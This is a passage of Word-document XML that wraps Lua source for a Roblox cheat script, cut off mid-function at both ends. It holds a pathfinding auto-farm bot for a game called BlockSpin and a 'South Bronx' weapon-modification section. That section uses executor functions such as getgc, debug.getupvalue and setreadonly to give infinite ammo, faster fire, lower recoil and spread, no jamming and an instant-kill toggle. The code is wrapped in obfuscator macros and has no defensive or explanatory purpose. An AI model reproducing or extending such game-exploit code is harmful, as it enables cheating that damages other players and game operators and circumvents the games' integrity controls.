        <w:t xml:space="preserve">                end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Get_Puddle = LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local CurrentPuddle, MaxDistance, BestPath = nil, math.huge, nil</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                for _, v in ipairs(Workspace.Map.Tiles.BurgerPlaceTile.BurgerPlace.Interior.Puddles:GetChildren()) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if v:IsA("BasePart") and v.Parent and (v.Name == "SmallPuddle" or v.Name == "LargePuddle") and v.Size.X &gt;= 1 and v.Size.Z &gt;= 1 and (v.Position - Vector3.new(150, 253, -250)).Magnitude &gt; 3 then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not hrp then continue end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local Path = Services.PathfindingService:CreatePath({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            AgentRadius = 1,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            AgentHeight = 4,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            AgentCanJump = false,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            AgentCanClimb = true,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        })</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local targetPos = v.Position + Vector3.new(0, 2, 0)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Path:ComputeAsync(hrp.Position, targetPos)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if Path.Status ~= Enum.PathStatus.NoPath then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            local dist = (hrp.Position - v.Position).Magnitude</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if dist &lt; MaxDistance then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                CurrentPuddle = v</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                MaxDistance = dist</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                BestPath = Path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return CurrentPuddle, BestPath</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Mop_FarmThread</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Start_MopFarm = function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Mop_FarmThread = task.spawn(LPH_JIT_MAX(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    while task.wait(1) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not Config.BlockSpin.AutoFarming.FarmMops then continue end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local character = LocalPlayer.Character</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local humanoid = character and character:FindFirstChild("Humanoid")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local hrp = character and character:FindFirstChild("HumanoidRootPart")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not humanoid or humanoid.Health &lt;= 0 or not hrp then continue end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local puddle, path = Get_Puddle()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not puddle or not puddle:IsDescendantOf(game) or puddle.Size.X &lt; 1 or puddle.Size.Z &lt; 1 or not path or path.Status == Enum.PathStatus.NoPath then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            continue</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.LeftShift, false, game)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local waypoints = path:GetWaypoints()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not puddle or not puddle:IsDescendantOf(game) or puddle.Size.X &lt; 1 or puddle.Size.Z &lt; 1 or not path or path.Status == Enum.PathStatus.NoPath then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            continue</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local default_time = puddle.Name == "SmallPuddle" and 5 or puddle.Name == "LargePuddle" and 10</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        default_time = </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            (Config.BlockSpin.AutoFarming.MopType == "Default" and default_time) or</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            (Config.BlockSpin.AutoFarming.MopType == "Silver" and default_time * 0.8) or</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            (Config.BlockSpin.AutoFarming.MopType == "Gold" and default_time * 0.7) or</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            (Config.BlockSpin.AutoFarming.MopType == "Diamond" and default_time * 0.6) or</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            default_time</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        for index, waypoint in ipairs(waypoints) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            humanoid:MoveTo(waypoint.Position)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            humanoid.MoveToFinished:Wait()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if not puddle:IsDescendantOf(game) or puddle.Size.X &lt; 1 or puddle.Size.Z &lt; 1 then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                break</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if index == #waypoints then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.LeftShift, false, game)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                PressKey(Enum.KeyCode.W, 0.1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                task.wait(default_time + 0.25)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end))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Stop_MopFarm = LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not Mop_FarmThread then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if coroutine.status(Mop_FarmThread) == "suspended" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    task.cancel(Mop_FarmThread)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LocalPlayer.CharacterAdded:Connect(LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if Mop_FarmThread then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Stop_MopFarm()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end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if Game_Name == "South Bronx" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if not Solara then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                CurrentGunHeld = nil;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local OldWeaponValues = {}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local GetAllTools = LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local Result = {}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    for _, Value in next, {LocalPlayer.Backpack, LocalPlayer.Character ~= nil and LocalPlayer.Character} do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if type(Value) == "userdata" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            for _, _Value in next, Value:GetChildren() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                if _Value:IsA("Tool") and _Value:FindFirstChild("Setting") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Result[#Result + 1] = _Value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</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    return Result</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local ReloadFunction = nil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                for Index, Value in getgc(true) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not (type(Value) == "function") then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local Function_Info = debug.getinfo(Value)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if tostring(Function_Info.name) == "Reload" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        ReloadFunction = Value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local RefreshReloadFunction = LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    for Index, Value in getgc() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if typeof(Value) == 'function' then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            local Function_Info = debug.getinfo(Value)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if tostring(Function_Info.name) == "Reload" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                ReloadFunction = Value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</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local GetSettings = LPH_NO_VIRTUALIZE(function(Weapon)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local Settings = {}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    for i,v in debug.getupvalue(ReloadFunction, 3) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if i ~= Weapon then continue end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Settings = v</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        break</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    return Settings</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local GetPercentage = LPH_NO_VIRTUALIZE(function(DefaultValue, NewValue)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    NewValue = math.max(0, math.min(100, NewValue))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local newRecoil = DefaultValue * (NewValue / 100)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    return newRecoil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local ModWeapon = LPH_JIT_MAX(function(Weapon)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if type(Weapon) ~= "userdata" then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not Weapon:IsA("Tool") then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if not Weapon:FindFirstChild("Setting") then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local Module = GetSettings(Weapon)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local ModuleSettings = rawget(Module, "Module")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local OldConfig = OldWeaponValues[Weapon.Name]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    task.spawn(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local Success, Error = pcall(LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            task.wait(0.05)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if Module == nil or ModuleSettings == nil then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                RefreshReloadFunction()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                if ReloadFunction == nil then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    return</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                Module = GetSettings(Weapon)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                ModuleSettings = rawget(Module, "Module")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if ModuleSettings == nil or Module == nil then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                return</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            setreadonly(Module, false)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            setreadonly(ModuleSettings, false)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if SetInfiniteAmmo == nil then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                SetInfiniteAmmo = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if SetInfiniteClips == nil then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                SetInfiniteClips = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            --[[if Config.South_Bronx._Modifications.InfiniteAmmo then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                Module.Mag = Config.South_Bronx._Modifications.InfiniteAmmo and math.huge or OldConfig.Ammo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                SetInfiniteAmmo = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if Config.South_Bronx._Modifications.InfiniteAmmo == false and SetInfiniteAmmo == false then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                Module.Mag = OldConfig.MaxAmmo / 2</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                SetInfiniteAmmo = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end]]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            --[[if Config.South_Bronx._Modifications.InfiniteClips then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                Module.Ammo = Config.South_Bronx._Modifications.InfiniteClips and 999999 or OldConfig.MaxAmmo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                SetInfiniteClips = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end]]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if Config.South_Bronx._Modifications.InfiniteClips == false and SetInfiniteClips == false then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                Module.Ammo = OldConfig.MaxAmmo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                SetInfiniteClips = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if ModuleSettings.LimitedAmmoEnabled then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                ModuleSettings.LimitedAmmoEnabled = Config.South_Bronx._Modifications.InfiniteAmmo and false or OldConfig.LimitedAmmoEnabled</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            task.spawn(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                while Weapon ~= nil and LocalPlayer.Character ~= nil and Weapon.Parent == LocalPlayer.Character and Module ~= nil and ModuleSettings ~= nil and ModuleSettings.FireRate ~= nil and task.wait(.1) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    if Config.South_Bronx._Modifications.DisableJamming then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        rawset(Module, "Jam", false)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        rawset(Module, "Canshoot", true)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    if Config.South_Bronx._Modifications.InfiniteAmmo then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        Module.Mag = OldConfig.AmmoPerMag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end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            ModuleSettings.FireRate = Config.South_Bronx._Modifications.ModifyFireRate and GetPercentage(OldConfig.FireRate, Config.South_Bronx._Modifications.FireRateSpeed) or OldConfig.FireRate</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            ModuleSettings.ReloadTime = Config.South_Bronx._Modifications.ModifyReloadSpeed and GetPercentage(OldConfig.ReloadTime, Config.South_Bronx._Modifications.ReloadSpeed) or OldConfig.ReloadTime</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            ModuleSettings.TacticalReloadTime = Config.South_Bronx._Modifications.ModifyReloadSpeed and GetPercentage(OldConfig.TacticalReloadTime, Config.South_Bronx._Modifications.ReloadSpeed) or OldConfig.TacticalReloadTime</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            ModuleSettings.EquippingTime = Config.South_Bronx._Modifications.ModifyEquipSpeed and GetPercentage(OldConfig.EquippingTime, Config.South_Bronx._Modifications.EquipSpeed) or OldConfig.EquippingTime</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            ModuleSettings.SpreadX = Config.South_Bronx._Modifications.ModifySpreadValue and GetPercentage(OldConfig.SpreadX, Config.South_Bronx._Modifications.SpreadPercentage) or OldConfig.SpreadX</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            ModuleSettings.SpreadY = Config.South_Bronx._Modifications.ModifySpreadValue and GetPercentage(OldConfig.SpreadY, Config.South_Bronx._Modifications.SpreadPercentage) or OldConfig.SpreadY</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            ModuleSettings.Recoil = Config.South_Bronx._Modifications.ModifyRecoilValue and GetPercentage(OldConfig.Recoil, Config.South_Bronx._Modifications.RecoilPercentage) or OldConfig.Recoil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            ModuleSettings.ShotgunEnabled = Config.South_Bronx._Modifications.InstantKill and true or OldConfig.ShotgunEnabled</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            ModuleSettings.Auto = Config.South_Bronx._Modifications.Automatic or OldConfig.Auto</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            ModuleSettings.JamChance = Config.South_Bronx._Modifications.DisableJamming and 0 or OldConfig.JamChance</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not Success and Error ~= nil then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            warn("[GUN MOD ERROR] :", Error)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local ModWeapons = LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    for _, Weapon in next, GetAllTools() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if Weapon:IsA("Tool") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            ModWeapon(Weapon)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</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local SetValues = LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    for _, Weapon in next, GetAllTools() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if Weapon:IsA("Tool") then</w:t>
      </w:r>
    </w:p>
